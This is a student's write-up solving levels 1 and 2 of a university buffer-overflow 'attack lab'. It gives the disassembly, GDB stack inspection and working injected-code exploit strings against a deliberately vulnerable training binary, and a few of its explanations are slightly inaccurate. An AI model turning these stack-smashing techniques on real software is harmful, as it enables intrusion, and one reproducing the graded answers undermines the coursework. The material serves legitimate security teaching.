# Attack lab

By Adrian Borup (adbo@itu.dk).

## Part I: Code Injection Attacks

### Level 1

We start by inspecting the assembly to find the address of the `touch1` function:

```asm
$ objdump -D ctarget | grep -A 14 "<touch1>"
0000000000402698 <touch1>:
  402698:       f3 0f 1e fa             endbr64
  40269c:       50                      push   %rax
  40269d:       58                      pop    %rax
  40269e:       48 83 ec 08             sub    $0x8,%rsp
  4026a2:       c7 05 50 82 0f 00 01    movl   $0x1,0xf8250(%rip)        # 4fa8fc <vlevel>
  4026a9:       00 00 00
  4026ac:       48 8d 3d 58 5c 0c 00    lea    0xc5c58(%rip),%rdi        # 4c830b <_IO_stdin_used+0x30b>
  4026b3:       e8 a8 a2 01 00          callq  41c960 <_IO_puts>
  4026b8:       bf 01 00 00 00          mov    $0x1,%edi
  4026bd:       e8 f4 04 00 00          callq  402bb6 <validate>
  4026c2:       bf 00 00 00 00          mov    $0x0,%edi
  4026c7:       e8 64 fb 00 00          callq  412230 <exit>

00000000004026cc <touch2>:
```

Our goal is now to overwrite the return address after `getbuf` so it points to `0x402698`. We want to know the size of the stack frame so we can overwrite the return address. Let's check out `getbuf`'s assembly code:

```asm
$ objdump -D ctarget | grep -A 9 -m 1 "<getbuf>"
000000000040267e <getbuf>:
  40267e:       f3 0f 1e fa             endbr64
  402682:       48 83 ec 28             sub    $0x28,%rsp
  402686:       48 89 e7                mov    %rsp,%rdi
  402689:       e8 b5 02 00 00          callq  402943 <Gets>
  40268e:       b8 01 00 00 00          mov    $0x1,%eax
  402693:       48 83 c4 28             add    $0x28,%rsp
  402697:       c3                      retq

0000000000402698 <touch1>:
```

At instruction `0x40267e`, we can see an integer constant `$0x28`, which is 40 in base 10. The return address, `%rsp`, is decremented with these 40 bytes - therefore our stack frame must be 40 bytes in size. We can confirm this by seeing if the program starts to misbehave between 39 and 40 bytes of input:

```sh
# File contains 39 bytes:
$ cat inp.txt
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00

# Pipe 39 bytes into the program:
$ cat inp.txt | ./hex2raw | ./ctarget
Cookie: 0x5d21660e
Type string:No exploit.  Getbuf returned 0x1
Normal return

# Pipe one more byte into the program:
$ (cat inp.txt; echo " 00") | ./hex2raw | ./ctarget
Cookie: 0x5d21660e
Type string:Ouch!: You caused a segmentation fault!
Better luck next time
FAILED
```

Yup! Boom. The segfault happens when we feed 40 bytes. Therefore, let's try to add another word (8 bytes) to the input so those bytes will overwrite the return address:

```diff
  00 00 00 00 00 00 00 00
  00 00 00 00 00 00 00 00
  00 00 00 00 00 00 00 00
  00 00 00 00 00 00 00 00
  00 00 00 00 00 00 00 00
+ 98 26 40 00 00 00 00 00
```

Here we've inserted the address of `touch1` (with the bytes reversed to obtain little-endian order). By feeding this to the vulnerable program, we see that the return address is indeed overwritten, and the instructions from `touch1` are executed:

```sh
$ ./hex2raw < inp.txt | ./ctarget
Cookie: 0x5d21660e
Type string:Touch1!: You called touch1()
Valid solution for level 1 with target ctarget
PASS: Sent exploit string to server to be validated.
NICE JOB!
```

### Level 2

First, let's locate `touch2`, and let's see what our unique cookie looks like:

```asm
$ objdump -D ctarget | grep -A 5 "<touch2>"
00000000004026cc <touch2>:
  4026cc:       f3 0f 1e fa             endbr64
  4026d0:       50                      push   %rax
  4026d1:       58                      pop    %rax
  4026d2:       48 83 ec 08             sub    $0x8,%rsp
  4026d6:       89 fa                   mov    %edi,%edx

$ cat cookie.txt
0x5d21660e 
```

Excellent - we can now write our exploit code. We'll do it in raw assembly:

```asm
# The %rdi register holds the first function argument. We write our cookie value
# into that register, so touch2 will receive it as the val argument.
mov $0x5d21660e,%rdi

# We push a return address onto the stack - in this case the address of touch2
push $0x4026cc

# Return, which will pop the stack and go to that address
ret
```

To obtain the byte representation of our exploit code, we save the above code in `exploit.s` and compile it:

```asm
$ gcc -c exploit.s && objdump -D exploit.o

exploit.o:     file format elf64-x86-64


Disassembly of section .text:

0000000000000000 <.text>:
   0:   48 c7 c7 0e 66 21 5d    mov    $0x5d21660e,%rdi
   7:   68 cc 26 40 00          pushq  $0x4026cc
   c:   c3                      retq
```

One last thing before we write our buffer overflow input: we need the address of our exploit code. First, let's overwrite the stack frame with these 39 bytes of input:

```sh
$ cat test.txt
12 34 56 78 90 ab cd ef
11 11 11 11 22 22 22 22
33 33 33 33 44 44 44 44
55 55 55 55 66 66 66 66
77 77 77 77 88 88 88

$ cat test.txt | ./hex2raw > test.bin
```

Then we can use GDB to inspect the values of the memory in the stack frame. From earlier, we know that `0x40268e` is the address of the instruction after `Gets` returns in `getbuf` (i.e. when our buffer overflow should have completed).

```sh
$ gdb ./ctarget
GNU gdb (Ubuntu 9.2-0ubuntu1~20.04.1) 9.2
...
Reading symbols from ./ctarget...

# Set breakpoint in getbuf right after Gets returns
(gdb) b *0x40268e
Breakpoint 1 at 0x40268e: file buf.c, line 15.

# Run the program with the above input
(gdb) r < test.bin
Starting program: /home/stud/adbo/exercises/22-Lab2-attacklab/target22/ctarget < test.bin
Cookie: 0x5d21660e

Breakpoint 1, getbuf () at buf.c:15
15      buf.c: No such file or directory.

# Starting from the stack pointer (register %rsp - the top of the stack), show
# the address and value of the next 48 bytes. That is, the stack frame and the
# following return address.
(gdb) x/48bx $rsp
0x55609288:     0x12    0x34    0x56    0x78    0x90    0xab    0xcd    0xef
0x55609290:     0x11    0x11    0x11    0x11    0x22    0x22    0x22    0x22
0x55609298:     0x33    0x33    0x33    0x33    0x44    0x44    0x44    0x44
0x556092a0:     0x55    0x55    0x55    0x55    0x66    0x66    0x66    0x66
0x556092a8:     0x77    0x77    0x77    0x77    0x88    0x88    0x88    0x00
0x556092b0:     0x79    0x28    0x40    0x00    0x00    0x00    0x00    0x00
```

We can see that our input bytes start at address `0x55609288`. The last line shows the address (`0x402879`) of the original instruction that we would normally return to - but we will overwrite this address with the address to our exploit code instead.

We can now create our final buffer overflow input:

```hex
$ cat inp.txt
/* Exploit code */
48 c7 c7 0e 66 21 5d    /* mov    $0x5d21660e,%rdi */
68 cc 26 40 00          /* pushq  $0x4026cc */
c3                      /* retq */

/* Padding */
00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00

/* Address of our exploit code */
88 92 60 55 00 00 00 00
```

And feed it to the vulnerable program:

```sh
$ ./hex2raw < inp.txt | ./ctarget
Cookie: 0x5d21660e
Type string:Touch2!: You called touch2(0x5d21660e)
Valid solution for level 2 with target ctarget
PASS: Sent exploit string to server to be validated.
NICE JOB!
```
